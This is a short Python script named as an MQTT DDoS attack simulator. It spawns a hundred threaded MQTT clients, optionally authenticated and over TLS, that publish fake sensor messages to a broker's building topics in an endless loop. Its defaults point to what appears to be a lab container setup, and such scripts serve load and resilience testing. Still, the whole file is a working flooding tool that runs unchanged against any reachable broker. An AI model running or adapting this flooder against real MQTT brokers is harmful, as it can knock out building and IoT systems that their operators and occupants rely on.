#!/usr/bin/env python3
# ddos_flooder.py — MQTT DDoS attack simulator

import os
import ssl
import json
import time
import random
import threading
import paho.mqtt.client as mqtt

# ========== CONFIG (from environment) ==========
BROKER = os.getenv("BROKER_ADDRESS", "mqtt-broker")
USERNAME = os.getenv("MQTT_USERNAME", "")
PASSWORD = os.getenv("MQTT_PASSWORD", "")
ENABLE_TLS = os.getenv("ENABLE_TLS", "false").lower() == "true"
ENABLE_AUTH = os.getenv("ENABLE_AUTH", "false").lower() == "true"
PORT = 8883 if ENABLE_TLS else 1883
THREADS = int(os.getenv("ATTACK_CLIENTS", "100"))  # clients to simulate
RATE = float(os.getenv("PUBLISH_RATE", "0.2"))     # seconds between messages
TOPIC_BASE = os.getenv("TARGET_TOPIC", "building/flood/test")

# ========== PAYLOAD ==========
def generate_payload():
    return json.dumps({
        "sensor": f"fake_{random.randint(1000,9999)}",
        "value": random.uniform(0, 10000),
        "timestamp": time.strftime("%d/%b/%y %H:%M:%S")
    })

# ========== WORKER THREAD ==========
def flood_worker(client_id):
    client = mqtt.Client(client_id=f"flooder_{client_id}")
    if ENABLE_AUTH:
        client.username_pw_set(USERNAME, PASSWORD)
    if ENABLE_TLS:
        client.tls_set(ca_certs="/mosquitto/certs/ca.crt", cert_reqs=ssl.CERT_REQUIRED)

    try:
        client.connect(BROKER, PORT)
        client.loop_start()
        print(f"[+] Client {client_id} connected")

        while True:
            topic = f"{TOPIC_BASE}/{random.randint(1,100)}"
            client.publish(topic, generate_payload(), qos=0)
            print(f"[{client_id}] → {topic}")
            time.sleep(RATE)
    except Exception as e:
        print(f"[!] Client {client_id} failed: {e}")

# ========== LAUNCH ATTACK ==========
print(f"\n🚨 Starting MQTT flood with {THREADS} clients at rate {RATE}s")
for i in range(THREADS):
    threading.Thread(target=flood_worker, args=(i,), daemon=True).start()

# ========== RUN FOREVER ==========
while True:
    time.sleep(10)

